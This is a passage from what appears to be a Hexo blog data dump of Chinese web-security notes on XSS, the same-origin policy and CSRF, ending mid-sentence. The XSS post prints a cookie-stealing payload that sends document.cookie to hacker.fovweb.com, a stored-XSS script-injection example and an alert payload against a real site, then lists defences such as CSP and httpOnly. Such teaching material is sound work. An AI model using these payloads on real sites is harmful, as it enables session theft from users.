http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E`\n3. 用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中；\n4. 请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者；\n\n**note:**\n* 链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等\n* 链接必须被用户点击才会触发\n* 危害范围小，受害者人数较少\n* 例子：`http://health.sohu.com/so/index.shtml?t=news&wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22`\n\n\n### 2. 持久型 XSS 步骤\n\n1. 攻击者向存在漏洞的网站注入恶意代码，如`http://a.com/a.jsp?name=xss<script src=http://b.com/b.js></script>`\n2. 用户访问该网站会下载 js 文件，并执行里面的代码\n3. js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者\n  \n**note：**\n* 攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等\n* 访问存在漏洞的网站就会触发\n* 危害范围大，受害者人数较多\n\n\n### 3. 防御措施\n* 设置 Content-Security-Policy 头信息（HTTP 头信息、html 的 meta 标签），控制浏览器能够为指定的页面加载哪些资源\n* 在服务器端设置 Cookie 为 `http-only`，浏览器会禁止 js 访问该 `Cookie`\n* 输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端）\n* 输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端）\n* 针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致\n* 利用模板引擎，避免内联事件，避免拼接 HTML\n\n##### 参考\n* [Content-Security-Policy文档](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy)\n","slug":"Web 安全/跨站脚本攻击(XSS)","published":1,"updated":"2021-05-11T02:17:50.503Z","_id":"cko402bgo000qox6r5lr42oet","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"跨站脚本攻击-XSS\"><a href=\"#跨站脚本攻击-XSS\" class=\"headerlink\" title=\"跨站脚本攻击 (XSS)\"></a>跨站脚本攻击 (XSS)</h1><p>跨站脚本攻击 XSS (Cross Site Scripts)</p>\n<p>说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行</p>\n<h3 id=\"1-反射型XSS步骤\"><a href=\"#1-反射型XSS步骤\" class=\"headerlink\" title=\"1. 反射型XSS步骤\"></a>1. 反射型XSS步骤</h3><ol>\n<li>用户正常登录Web应用程序，登录成功会得到一个会话信息的 <code>cookie</code></li>\n<li>攻击者将含有攻击代码的URL发送给被攻击人，例：<code>http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E</code></li>\n<li>用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中；</li>\n<li>请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者；</li>\n</ol>\n<p><strong>note:</strong></p>\n<ul>\n<li>链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等</li>\n<li>链接必须被用户点击才会触发</li>\n<li>危害范围小，受害者人数较少</li>\n<li>例子：<code>http://health.sohu.com/so/index.shtml?t=news&amp;wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22</code></li>\n</ul>\n<h3 id=\"2-持久型-XSS-步骤\"><a href=\"#2-持久型-XSS-步骤\" class=\"headerlink\" title=\"2. 持久型 XSS 步骤\"></a>2. 持久型 XSS 步骤</h3><ol>\n<li>攻击者向存在漏洞的网站注入恶意代码，如<code>http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt;</code></li>\n<li>用户访问该网站会下载 js 文件，并执行里面的代码</li>\n<li>js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者</li>\n</ol>\n<p><strong>note：</strong></p>\n<ul>\n<li>攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等</li>\n<li>访问存在漏洞的网站就会触发</li>\n<li>危害范围大，受害者人数较多</li>\n</ul>\n<h3 id=\"3-防御措施\"><a href=\"#3-防御措施\" class=\"headerlink\" title=\"3. 防御措施\"></a>3. 防御措施</h3><ul>\n<li>设置 Content-Security-Policy 头信息（HTTP 头信息、html 的 meta 标签），控制浏览器能够为指定的页面加载哪些资源</li>\n<li>在服务器端设置 Cookie 为 <code>http-only</code>，浏览器会禁止 js 访问该 <code>Cookie</code></li>\n<li>输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端）</li>\n<li>输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端）</li>\n<li>针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致</li>\n<li>利用模板引擎，避免内联事件，避免拼接 HTML</li>\n</ul>\n<h5 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h5><ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy\">Content-Security-Policy文档</a></li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"跨站脚本攻击-XSS\"><a href=\"#跨站脚本攻击-XSS\" class=\"headerlink\" title=\"跨站脚本攻击 (XSS)\"></a>跨站脚本攻击 (XSS)</h1><p>跨站脚本攻击 XSS (Cross Site Scripts)</p>\n<p>说明：攻击者盗取用户的身份信息（如Cookie）、导航到恶意网址、携带木马病毒等 原理：攻击者在网页中嵌入客户端脚本(如JavaScript), 用户浏览网页就会触发恶意脚本执行</p>\n<h3 id=\"1-反射型XSS步骤\"><a href=\"#1-反射型XSS步骤\" class=\"headerlink\" title=\"1. 反射型XSS步骤\"></a>1. 反射型XSS步骤</h3><ol>\n<li>用户正常登录Web应用程序，登录成功会得到一个会话信息的 <code>cookie</code></li>\n<li>攻击者将含有攻击代码的URL发送给被攻击人，例：<code>http://fovweb.com/xss/message.php?send=%3Cscript%3Edocument.write(‘%3Cimg%20height=0%20width=0%20src=%22 http://hacker.fovweb.com/xss/cookie_save.php%3Fcookie=%3D’%20+%20encodeURL(document.cookie)%20+%20’%22/%3E’)%3C/script%3E</code></li>\n<li>用户打开攻击者发送过来的 URL, Web 应用程序执行用户发出的请求，并将请求参数显示在页面中；</li>\n<li>请求参数中包含的 JavaScript 代码会被执行，用户的 cookie 信息将会被发送到攻击者；</li>\n</ol>\n<p><strong>note:</strong></p>\n<ul>\n<li>链接中的请求参数会被显示在页面中，如搜索关键字、表单输入框等</li>\n<li>链接必须被用户点击才会触发</li>\n<li>危害范围小，受害者人数较少</li>\n<li>例子：<code>http://health.sohu.com/so/index.shtml?t=news&amp;wd=%E6%84%9F%E5%86%92%27%22onmouseover=%22alert(document.cookie)%22</code></li>\n</ul>\n<h3 id=\"2-持久型-XSS-步骤\"><a href=\"#2-持久型-XSS-步骤\" class=\"headerlink\" title=\"2. 持久型 XSS 步骤\"></a>2. 持久型 XSS 步骤</h3><ol>\n<li>攻击者向存在漏洞的网站注入恶意代码，如<code>http://a.com/a.jsp?name=xss&lt;script src=http://b.com/b.js&gt;&lt;/script&gt;</code></li>\n<li>用户访问该网站会下载 js 文件，并执行里面的代码</li>\n<li>js 可获取用户所有的所有信息（包括Cookie、Session等）并发送给攻击者</li>\n</ol>\n<p><strong>note：</strong></p>\n<ul>\n<li>攻击者提交的数据会被显示出来，并被所有人看到，如社区评论等</li>\n<li>访问存在漏洞的网站就会触发</li>\n<li>危害范围大，受害者人数较多</li>\n</ul>\n<h3 id=\"3-防御措施\"><a href=\"#3-防御措施\" class=\"headerlink\" title=\"3. 防御措施\"></a>3. 防御措施</h3><ul>\n<li>设置 Content-Security-Policy 头信息（HTTP 头信息、html 的 meta 标签），控制浏览器能够为指定的页面加载哪些资源</li>\n<li>在服务器端设置 Cookie 为 <code>http-only</code>，浏览器会禁止 js 访问该 <code>Cookie</code></li>\n<li>输入检查，对用户提交的数据进行校验，对特殊字符进行编码和过滤（主要在后端）</li>\n<li>输出检查，对渲染到 html 中的内容进行 htmlEncode（主要在前端）</li>\n<li>针对不同的上下文调用不同的转义规则，如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等，所需要的转义规则不一致</li>\n<li>利用模板引擎，避免内联事件，避免拼接 HTML</li>\n</ul>\n<h5 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h5><ul>\n<li><a href=\"https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy\">Content-Security-Policy文档</a></li>\n</ul>\n"},{"title":"同源策略（SOP）","date":"2021-01-14T07:44:00.000Z","_content":"\n# 同源策略（SOP）\n\n同源策略（Same Origin Policy）\n\n定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。\n\n说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 **document** 或脚本，对当前 **document** 读取或设置某些属性。\n\n> `协议`、`元素`、`端口`三者组成的算法叫做 **源**。\n\n> 同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 `cookie`、`localStoreage`、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 `location.assign()` 、`location.replace()`。\n\n作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。\n\n> 同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步\n> A 网站载入 B 网站的脚本，则该脚本的源为 A 网站，只有和当前页文档同源的脚本才会被执行\n> 在浏览器中，`<script>`、`<img>`、`<iframe>`、`<link>` 等标签都可以加载跨域资源，而不受同源限制\n> XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问\n\n### 1 跨文档通信的限制（相关网站间通信）\n1. 设置 `document.domain`（比较复杂、同时也有安全问题，不推荐使用）\n2. 使用 `windown.postMessage`、`window.onmessage`\n\n\n### 2 XMLHttpRequest 的同源策略\n老版本的 **XMLHttpRequest Level 1**，有如下几个缺点：\n* 只支持文本数据的传送，无法用来读取和上传二进制文件。\n* 传送和接收数据时，没有进度信息，只能提存在 没有完成。\n* 受到\"同域限制\"（Same Origin: Origin  Po时，licy），只能向同一域名的服务器请求数据。\n\n新版本的 **XMLHttpRequest Level 2**，新增了如下几个功能：\n* 可以设置HTTP请求的时限（超时时间）\n* 可以使用 FormData 对象管理表单数据\n* 可以上传文件（二进制数据）\n* 可以请求不同域名下的数据（跨域请求）\n* 可以获取服务器端的二进制数据\n* 可以获得数据传输的进度信息\n\n> 跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 `Access-Control-Allow-Origin: Origin` 字段时，XMLHttpRequest 才能访问响应结果\n\n### 3 Web Storeage 的同源策略\n\nlocalStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。\n\n* localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K\n* localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换\n* localStorage 在浏览器的隐私模式下面是不可读取的\n* localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡\n* localStorage 不能被爬虫抓取到\n\n\n### 4 Cookie 的安全策略\n\nCookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。\n\n网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： **httpOnly** 和 **secure** 。\n* **httpOnly** 标签可以禁止使用 **document.cookle** API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。\n* **secure** 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。\n\n当依赖于 HTTP Cookies 做身份认证时：\n* 使用 **httpOnly** 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。\n* 如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 **secure** ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 **secure** 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。","source":"_posts/Web 安全/同源策略(SOP).md","raw":"---\ntitle: 同源策略（SOP）\ncategories: Web 安全\ntags: [web 安全]\ndate: 2021-01-14 15:44:00\n---\n\n# 同源策略（SOP）\n\n同源策略（Same Origin Policy）\n\n定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。\n\n说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 **document** 或脚本，对当前 **document** 读取或设置某些属性。\n\n> `协议`、`元素`、`端口`三者组成的算法叫做 **源**。\n\n> 同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 `cookie`、`localStoreage`、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 `location.assign()` 、`location.replace()`。\n\n作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。\n\n> 同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步\n> A 网站载入 B 网站的脚本，则该脚本的源为 A 网站，只有和当前页文档同源的脚本才会被执行\n> 在浏览器中，`<script>`、`<img>`、`<iframe>`、`<link>` 等标签都可以加载跨域资源，而不受同源限制\n> XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问\n\n### 1 跨文档通信的限制（相关网站间通信）\n1. 设置 `document.domain`（比较复杂、同时也有安全问题，不推荐使用）\n2. 使用 `windown.postMessage`、`window.onmessage`\n\n\n### 2 XMLHttpRequest 的同源策略\n老版本的 **XMLHttpRequest Level 1**，有如下几个缺点：\n* 只支持文本数据的传送，无法用来读取和上传二进制文件。\n* 传送和接收数据时，没有进度信息，只能提存在 没有完成。\n* 受到\"同域限制\"（Same Origin: Origin  Po时，licy），只能向同一域名的服务器请求数据。\n\n新版本的 **XMLHttpRequest Level 2**，新增了如下几个功能：\n* 可以设置HTTP请求的时限（超时时间）\n* 可以使用 FormData 对象管理表单数据\n* 可以上传文件（二进制数据）\n* 可以请求不同域名下的数据（跨域请求）\n* 可以获取服务器端的二进制数据\n* 可以获得数据传输的进度信息\n\n> 跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 `Access-Control-Allow-Origin: Origin` 字段时，XMLHttpRequest 才能访问响应结果\n\n### 3 Web Storeage 的同源策略\n\nlocalStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。\n\n* localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K\n* localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换\n* localStorage 在浏览器的隐私模式下面是不可读取的\n* localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡\n* localStorage 不能被爬虫抓取到\n\n\n### 4 Cookie 的安全策略\n\nCookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。\n\n网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： **httpOnly** 和 **secure** 。\n* **httpOnly** 标签可以禁止使用 **document.cookle** API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。\n* **secure** 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。\n\n当依赖于 HTTP Cookies 做身份认证时：\n* 使用 **httpOnly** 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。\n* 如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 **secure** ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 **secure** 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。","slug":"Web 安全/同源策略(SOP)","published":1,"updated":"2021-04-30T07:34:20.135Z","_id":"cko402yd1000tox6rf6we9ypt","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"同源策略（SOP）\"><a href=\"#同源策略（SOP）\" class=\"headerlink\" title=\"同源策略（SOP）\"></a>同源策略（SOP）</h1><p>同源策略（Same Origin Policy）</p>\n<p>定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。</p>\n<p>说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 <strong>document</strong> 或脚本，对当前 <strong>document</strong> 读取或设置某些属性。</p>\n<blockquote>\n<p><code>协议</code>、<code>元素</code>、<code>端口</code>三者组成的算法叫做 <strong>源</strong>。</p>\n</blockquote>\n<blockquote>\n<p>同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 <code>cookie</code>、<code>localStoreage</code>、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 <code>location.assign()</code> 、<code>location.replace()</code>。</p>\n</blockquote>\n<p>作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。</p>\n<blockquote>\n<p>同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步<br>A 网站载入 B 网站的脚本，则该脚本的源为 A 网站，只有和当前页文档同源的脚本才会被执行<br>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签都可以加载跨域资源，而不受同源限制<br>XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问</p>\n</blockquote>\n<h3 id=\"1-跨文档通信的限制（相关网站间通信）\"><a href=\"#1-跨文档通信的限制（相关网站间通信）\" class=\"headerlink\" title=\"1 跨文档通信的限制（相关网站间通信）\"></a>1 跨文档通信的限制（相关网站间通信）</h3><ol>\n<li>设置 <code>document.domain</code>（比较复杂、同时也有安全问题，不推荐使用）</li>\n<li>使用 <code>windown.postMessage</code>、<code>window.onmessage</code></li>\n</ol>\n<h3 id=\"2-XMLHttpRequest-的同源策略\"><a href=\"#2-XMLHttpRequest-的同源策略\" class=\"headerlink\" title=\"2 XMLHttpRequest 的同源策略\"></a>2 XMLHttpRequest 的同源策略</h3><p>老版本的 <strong>XMLHttpRequest Level 1</strong>，有如下几个缺点：</p>\n<ul>\n<li>只支持文本数据的传送，无法用来读取和上传二进制文件。</li>\n<li>传送和接收数据时，没有进度信息，只能提存在 没有完成。</li>\n<li>受到”同域限制”（Same Origin: Origin  Po时，licy），只能向同一域名的服务器请求数据。</li>\n</ul>\n<p>新版本的 <strong>XMLHttpRequest Level 2</strong>，新增了如下几个功能：</p>\n<ul>\n<li>可以设置HTTP请求的时限（超时时间）</li>\n<li>可以使用 FormData 对象管理表单数据</li>\n<li>可以上传文件（二进制数据）</li>\n<li>可以请求不同域名下的数据（跨域请求）</li>\n<li>可以获取服务器端的二进制数据</li>\n<li>可以获得数据传输的进度信息</li>\n</ul>\n<blockquote>\n<p>跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 <code>Access-Control-Allow-Origin: Origin</code> 字段时，XMLHttpRequest 才能访问响应结果</p>\n</blockquote>\n<h3 id=\"3-Web-Storeage-的同源策略\"><a href=\"#3-Web-Storeage-的同源策略\" class=\"headerlink\" title=\"3 Web Storeage 的同源策略\"></a>3 Web Storeage 的同源策略</h3><p>localStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。</p>\n<ul>\n<li>localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K</li>\n<li>localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换</li>\n<li>localStorage 在浏览器的隐私模式下面是不可读取的</li>\n<li>localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡</li>\n<li>localStorage 不能被爬虫抓取到</li>\n</ul>\n<h3 id=\"4-Cookie-的安全策略\"><a href=\"#4-Cookie-的安全策略\" class=\"headerlink\" title=\"4 Cookie 的安全策略\"></a>4 Cookie 的安全策略</h3><p>Cookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。</p>\n<p>网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： <strong>httpOnly</strong> 和 <strong>secure</strong> 。</p>\n<ul>\n<li><strong>httpOnly</strong> 标签可以禁止使用 <strong>document.cookle</strong> API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。</li>\n<li><strong>secure</strong> 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。</li>\n</ul>\n<p>当依赖于 HTTP Cookies 做身份认证时：</p>\n<ul>\n<li>使用 <strong>httpOnly</strong> 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。</li>\n<li>如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 <strong>secure</strong> ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 <strong>secure</strong> 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"同源策略（SOP）\"><a href=\"#同源策略（SOP）\" class=\"headerlink\" title=\"同源策略（SOP）\"></a>同源策略（SOP）</h1><p>同源策略（Same Origin Policy）</p>\n<p>定义：除非所处的两个页面的协议、DNS域名、端口都完全一致，否则两个独立的 JavaScript 运行环境不能访问彼此的 DOM，其他任何跨文档的 JavaScript DOM 访问也会失败。</p>\n<p>说明：两个 URL 的协议、域名和端口相同，则表示他们同源。对于不同源的 <strong>document</strong> 或脚本，对当前 <strong>document</strong> 读取或设置某些属性。</p>\n<blockquote>\n<p><code>协议</code>、<code>元素</code>、<code>端口</code>三者组成的算法叫做 <strong>源</strong>。</p>\n</blockquote>\n<blockquote>\n<p>同源策略开始时只是用于现在对 DOM 结构的访问，之后扩展为保护 JavaScript 对跟对象下的某些敏感数据，如 <code>cookie</code>、<code>localStoreage</code>、Ajax 请求等，但同源策略机制并非包含所有，如非同源的脚本对任意窗口调用 <code>location.assign()</code> 、<code>location.replace()</code>。</p>\n</blockquote>\n<p>作用：防止跨域读写某些资源，为浏览器提供沙箱环境，使进程在一个相对独立的空间运行，能在一定程度上保护浏览器安全。</p>\n<blockquote>\n<p>同源策略无法和全局身份认证、SSL 状态、网络上下文环境以及众多有浏览器管理涉及安全的其他参数进行同步<br>A 网站载入 B 网站的脚本，则该脚本的源为 A 网站，只有和当前页文档同源的脚本才会被执行<br>在浏览器中，<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;link&gt;</code> 等标签都可以加载跨域资源，而不受同源限制<br>XMLHttpRequest 受到同源策略的约束，不能够跨域访问资源，可通过目标域返回的 HTTP 头来授权是否允许跨域访问</p>\n</blockquote>\n<h3 id=\"1-跨文档通信的限制（相关网站间通信）\"><a href=\"#1-跨文档通信的限制（相关网站间通信）\" class=\"headerlink\" title=\"1 跨文档通信的限制（相关网站间通信）\"></a>1 跨文档通信的限制（相关网站间通信）</h3><ol>\n<li>设置 <code>document.domain</code>（比较复杂、同时也有安全问题，不推荐使用）</li>\n<li>使用 <code>windown.postMessage</code>、<code>window.onmessage</code></li>\n</ol>\n<h3 id=\"2-XMLHttpRequest-的同源策略\"><a href=\"#2-XMLHttpRequest-的同源策略\" class=\"headerlink\" title=\"2 XMLHttpRequest 的同源策略\"></a>2 XMLHttpRequest 的同源策略</h3><p>老版本的 <strong>XMLHttpRequest Level 1</strong>，有如下几个缺点：</p>\n<ul>\n<li>只支持文本数据的传送，无法用来读取和上传二进制文件。</li>\n<li>传送和接收数据时，没有进度信息，只能提存在 没有完成。</li>\n<li>受到”同域限制”（Same Origin: Origin  Po时，licy），只能向同一域名的服务器请求数据。</li>\n</ul>\n<p>新版本的 <strong>XMLHttpRequest Level 2</strong>，新增了如下几个功能：</p>\n<ul>\n<li>可以设置HTTP请求的时限（超时时间）</li>\n<li>可以使用 FormData 对象管理表单数据</li>\n<li>可以上传文件（二进制数据）</li>\n<li>可以请求不同域名下的数据（跨域请求）</li>\n<li>可以获取服务器端的二进制数据</li>\n<li>可以获得数据传输的进度信息</li>\n</ul>\n<blockquote>\n<p>跨域资源共享（CORS）是针对 XMLHttpRequrest 的意向建设性扩展，用这种方式发送跨域 HTTP 请求时，由于 XMLHttpRequest 受到同源策略的约束，请求结果会被浏览器拦截，当响应头存在 <code>Access-Control-Allow-Origin: Origin</code> 字段时，XMLHttpRequest 才能访问响应结果</p>\n</blockquote>\n<h3 id=\"3-Web-Storeage-的同源策略\"><a href=\"#3-Web-Storeage-的同源策略\" class=\"headerlink\" title=\"3 Web Storeage 的同源策略\"></a>3 Web Storeage 的同源策略</h3><p>localStorage 对象实现的是与站点源性相关的持久存储，关闭浏览器之后 localStorage 任然有效，而 sessionStorage 则绑定了当前浏览器窗口，提供的是临时的缓存机制，在浏览回话结束之后被清除掉。</p>\n<ul>\n<li>localStorage 的大小大约为 5M，而 Cookie 的单个大小为 4K</li>\n<li>localStorage 的值类型限定为 string类型，在读取数据时需要进行一些转换</li>\n<li>localStorage 在浏览器的隐私模式下面是不可读取的</li>\n<li>localStorage 本质上是对字符串的读取，如果存储内容多的话会消耗内存空间，会导致页面变卡</li>\n<li>localStorage 不能被爬虫抓取到</li>\n</ul>\n<h3 id=\"4-Cookie-的安全策略\"><a href=\"#4-Cookie-的安全策略\" class=\"headerlink\" title=\"4 Cookie 的安全策略\"></a>4 Cookie 的安全策略</h3><p>Cookie 的出现要早于同源策略，所以两者在某些方面可能会存在一些问题。</p>\n<p>网站服务器对 Cookie 提供了两个特殊的可单独设置的标记： <strong>httpOnly</strong> 和 <strong>secure</strong> 。</p>\n<ul>\n<li><strong>httpOnly</strong> 标签可以禁止使用 <strong>document.cookle</strong> API 来访问页面的 Cookie ，这样即使页面真的被注入了恶意代码，也无法简单地用这个 API 复制出用户的身份信息。</li>\n<li><strong>secure</strong> 标签使得 Cookie 无法被用在非加密协议的通道里，这样就必须使用 HTTPS 服务所以能防御主动攻击。</li>\n</ul>\n<p>当依赖于 HTTP Cookies 做身份认证时：</p>\n<ul>\n<li>使用 <strong>httpOnly</strong> 标签；设计 Web 应用时谨记不要让 Javascript 直接访问到身份授权的 Cookie 信息。需要把敏感 Cookie 的有效范围设呈得越小越好，最好不要指定 Cookie 的 domain 值。</li>\n<li>如果应用是完全墓于 HTTPS 的，那 Cookie 就应该标记为 <strong>secure</strong> ，而且必须时 Cookie 注入有完善的处理（ HTTP 运行环境可能导致标记为 <strong>secure</strong> 的 Cookie 被覆盖，即使无法被读取）对 Cookie 进行加密签名也许能防范这种超出控制的墓改行为，但也仍然无法阻止受害者的 Cookie 被替换成另一组由合法方式获取的 Cookie 身份。</li>\n</ul>\n"},{"title":"跨站请求伪造 (CSRF)","date":"2021-01-14T07:41:00.000Z","_content":"\n# 跨站请求伪造 (CSRF)\n\n跨站请求伪造 （Cross-Site Request Forgery ，简称为 CRFR/XSRF)\n\n说明：攻击者盗取用户的身份信息，以用户的名义进行恶意操作（数据查询、转账、删除等）\n\n原理：CSRF 攻击是源于 WEB 的隐式身份验证机制（几乎都是使用 Cookie 来识别用户身份以及保存会话状态）。WEB 的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的，因为服务器并不知道 Get、Post 